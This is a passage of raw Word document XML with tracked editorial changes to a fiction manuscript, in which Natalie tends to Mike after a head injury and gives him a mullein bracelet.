      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:ins w:id="1628" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidR="00C02149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1629" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidR="00C02149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">fingertips </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>traced</w:t>
      </w:r>
      <w:del w:id="1630" w:author="TextVet" w:date="2016-03-19T14:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C02149">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> her fingers along</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the inside of his wrist. As </w:t>
      </w:r>
      <w:ins w:id="1631" w:author="TextVet" w:date="2016-03-19T14:12:00Z">
        <w:r w:rsidR="00B07742">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>she</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1632" w:author="TextVet" w:date="2016-03-19T14:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B07742">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>her fingertips</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> brushed across his skin, the rhythmic throb of his ulnar artery conveniently grew visible to her naked eye. She breathed on the end of the stethoscope to warm it, and carefully laid it against the inside of his elbow. “Hey,” she said to him. “You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“Me?” he answered with an overconfident smile. “Yeah, of course. Doing great! Why?”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 pulse is racing.”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checked Tina’s numbers. “He’ll be fine,” said Natalie. “Drink some orange juice, eat some protein bars, and rest for a while.” She ruffled his floppy brown hair and said to him, “Think you can handle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replied, “Mind if I raid your fridge?”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Natalie looked </w:t>
      </w:r>
      <w:ins w:id="1633" w:author="TextVet" w:date="2016-03-19T14:15:00Z">
        <w:r w:rsidR="001334E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>somewhat</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1634" w:author="TextVet" w:date="2016-03-19T14:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001334E3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a little</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> sheepish. “All I have</w:t>
      </w:r>
      <w:del w:id="1635" w:author="TextVet" w:date="2016-03-19T14:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0065202F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in the house</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is liquor and frozen pot pies. But there’s a Rite Aid on Madison and Summit</w:t>
      </w:r>
      <w:ins w:id="1636" w:author="TextVet" w:date="2016-03-19T14:14:00Z">
        <w:r w:rsidR="005A11FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1637" w:author="TextVet" w:date="2016-03-19T14:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A11FB">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638" w:author="TextVet" w:date="2016-03-19T14:14:00Z">
        <w:r w:rsidR="005A11FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1639" w:author="TextVet" w:date="2016-03-19T14:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005A11FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>W</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>alking distance. Tina will help you get there. Right,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w:t>
      </w:r>
      <w:del w:id="1640" w:author="TextVet" w:date="2016-03-19T14:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D667D7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">quickly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shot her a dirty look. “Sure. No problem.”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took away his bloodied flannel</w:t>
      </w:r>
      <w:ins w:id="1641" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidR="00BF501B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
        <w:r w:rsidR="00BF501B" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>“Her</w:t>
        </w:r>
        <w:r w:rsidR="006D7294">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1642" w:author="TextVet" w:date="2016-03-19T14:18:00Z">
        <w:r w:rsidR="00707452">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1643" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidR="00BF501B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> wear this,” she offered,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1644" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF501B">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del w:id="1645" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF501B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shov</w:t>
      </w:r>
      <w:del w:id="1646" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF501B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1647" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidR="00BF501B">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a wad of fresh clothes into his hands.</w:t>
      </w:r>
      <w:del w:id="1648" w:author="TextVet" w:date="2016-03-19T14:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BF501B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> “Here. You can wear this,” she said.</w:delText>
        </w:r>
      </w:del>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held up the </w:t>
      </w:r>
      <w:del w:id="1649" w:author="TextVet" w:date="2016-03-19T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B53EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>clothes</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1650" w:author="TextVet" w:date="2016-03-19T14:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B53EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in front of him</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1651" w:author="TextVet" w:date="2016-03-19T14:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B53EAE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. She had given him a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shapeless flower-print sweatshirt. “Thanks, Doc,” he said with equal parts sincerity and sarcasm.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sashayed over to the couch. She turned to Jason</w:t>
      </w:r>
      <w:ins w:id="1652" w:author="TextVet" w:date="2016-03-19T14:20:00Z">
        <w:r w:rsidR="00811245">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del w:id="1653" w:author="TextVet" w:date="2016-03-19T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00811245">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sa</w:t>
      </w:r>
      <w:ins w:id="1654" w:author="TextVet" w:date="2016-03-19T14:20:00Z">
        <w:r w:rsidR="00811245">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ying</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1655" w:author="TextVet" w:date="2016-03-19T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00811245">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>id</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “Hey. You’re the one with the car, right? Can you drive us to Swedish? It’s only about three blocks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nodded.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“Good,” she replied, and turned to Mike. “And now, as for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She reached out with both arms, took him by the hands, and helped him rise from the couch. “Ready to get your head examined?”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didn’t answer.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“You’ll be okay, Mike,” she said quietly.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nodded.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“Here, this will help.” She opened a closet near the front door, and rummaged inside. “Normally</w:t>
      </w:r>
      <w:ins w:id="1656" w:author="TextVet" w:date="2016-03-19T14:21:00Z">
        <w:r w:rsidR="00E0637D">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I’d give someone sedatives to reduce anxiety, but I don’t want to take chances with your head right now. What I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> give you, though, is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pulled out her large</w:t>
      </w:r>
      <w:ins w:id="1657" w:author="TextVet" w:date="2016-03-19T14:22:00Z">
        <w:r w:rsidR="00E4232A">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homemade woven bracelet of small yellow flowers</w:t>
      </w:r>
      <w:del w:id="1658" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00707DAB">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and </w:t>
      </w:r>
      <w:ins w:id="1659" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidR="00D94499">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>wrapped</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1660" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D94499">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>put</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it </w:t>
      </w:r>
      <w:ins w:id="1661" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidR="00D94499">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ar</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:ins w:id="1662" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidR="00D94499">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>u</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:ins w:id="1663" w:author="TextVet" w:date="2016-03-19T14:25:00Z">
        <w:r w:rsidR="00D94499">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his wrist.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00AA6F8F" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1664" w:author="TextVet" w:date="2016-03-19T14:23:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1665" w:author="TextVet" w:date="2016-03-19T14:23:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AA6F8F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With a f</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ascinated</w:t>
      </w:r>
      <w:del w:id="1666" w:author="TextVet" w:date="2016-03-19T14:23:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AA6F8F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> expression</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Mike </w:t>
      </w:r>
      <w:ins w:id="1667" w:author="TextVet" w:date="2016-03-19T14:22:00Z">
        <w:r w:rsidR="00E4232A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>p</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1668" w:author="TextVet" w:date="2016-03-19T14:22:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00E4232A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="1669" w:author="TextVet" w:date="2016-03-19T14:23:00Z">
        <w:r w:rsidR="00E4232A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pe</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d, “Mullein!”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Natalie’s jaw dropped. “You know what this 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said, “I’ve never seen it in real life before.”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 you know what it does?”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1670" w:author="TextVet" w:date="2016-03-19T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003C3FE0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Mike answered, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“It grants the wearer a plus-four bonus on saving throws versus fear.”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hopped in place just a little bit.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examined </w:t>
      </w:r>
      <w:ins w:id="1671" w:author="TextVet" w:date="2016-03-19T14:28:00Z">
        <w:r w:rsidR="00BB0006">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>his</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1672" w:author="TextVet" w:date="2016-03-19T14:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BB0006">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>the</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> mullein bracelet</w:t>
      </w:r>
      <w:del w:id="1673" w:author="TextVet" w:date="2016-03-19T14:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BB0006">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> around his wrist</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. His eyes began </w:t>
      </w:r>
      <w:del w:id="1674" w:author="TextVet" w:date="2016-03-19T14:28:00Z">
